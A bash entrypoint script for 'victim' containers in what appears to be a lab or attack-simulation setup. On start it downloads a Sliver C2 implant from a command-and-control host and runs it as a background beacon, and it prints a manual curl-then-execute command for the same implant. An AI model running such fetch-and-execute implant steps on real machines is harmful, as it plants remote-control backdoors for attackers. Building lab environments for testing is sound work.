#!/usr/bin/env bash
# Docker entrypoint for victim containers.
#
# Sequence:
#   1. Wait for the scenario API health endpoint to be reachable.
#   2. Request the Linux implant binary from the scenario server.
#      The server generates and caches it on first request (takes ~1-2 min);
#      subsequent victims reuse the cached binary.
#   3. Execute the beacon in the background.
#   4. Keep the container alive for manual testing via docker exec.
set -euo pipefail

C2_HOST="${C2_HOST:-172.20.0.10}"
SCENARIO_API="${SCENARIO_API:-http://${C2_HOST}:8080/api/v1}"
IMPLANT_PATH="/usr/local/bin/sliver-beacon"

# ── 1. Wait for scenario API ──────────────────────────────────────────────────
echo "[victim] Waiting for scenario API at ${SCENARIO_API}/health..."
for i in $(seq 1 60); do
  if curl -sf "${SCENARIO_API}/health" > /dev/null 2>&1; then
    echo "[victim] API is ready"
    break
  fi
  echo "[victim] Attempt ${i}/60 — API not ready yet, retrying in 5s..."
  sleep 5
done

# ── 2. Download implant (with long timeout for first-time compilation) ────────
echo "[victim] Requesting Linux implant (first request triggers compilation, please wait)..."
IMPLANT_URL="${SCENARIO_API}/implant/linux?c2=${C2_HOST}"

for attempt in $(seq 1 20); do
  HTTP_CODE=$(curl -sf \
    --connect-timeout 10 \
    --max-time 300 \
    -w "%{http_code}" \
    "${IMPLANT_URL}" \
    -o "${IMPLANT_PATH}" 2>/dev/null || echo "000")

  if [ "${HTTP_CODE}" = "200" ] && [ -s "${IMPLANT_PATH}" ]; then
    echo "[victim] Implant downloaded ($(wc -c < "${IMPLANT_PATH}") bytes)"
    break
  fi

  echo "[victim] Attempt ${attempt}/20 — HTTP ${HTTP_CODE}, retrying in 15s..."
  rm -f "${IMPLANT_PATH}"
  sleep 15
done

# ── 3. Execute beacon ─────────────────────────────────────────────────────────
if [ -s "${IMPLANT_PATH}" ]; then
  chmod +x "${IMPLANT_PATH}"
  echo "[victim] Launching beacon..."
  "${IMPLANT_PATH}" &
  echo "[victim] Beacon PID $!"
else
  echo "[victim] WARNING: Could not obtain implant. Container will stay alive for manual use."
  echo "[victim] To install manually: curl ${IMPLANT_URL} -o ${IMPLANT_PATH} && chmod +x ${IMPLANT_PATH} && ${IMPLANT_PATH} &"
fi

# ── 4. Keep container alive ───────────────────────────────────────────────────
echo "[victim] Ready. Use: docker-compose exec victim-1 bash"
exec sleep infinity
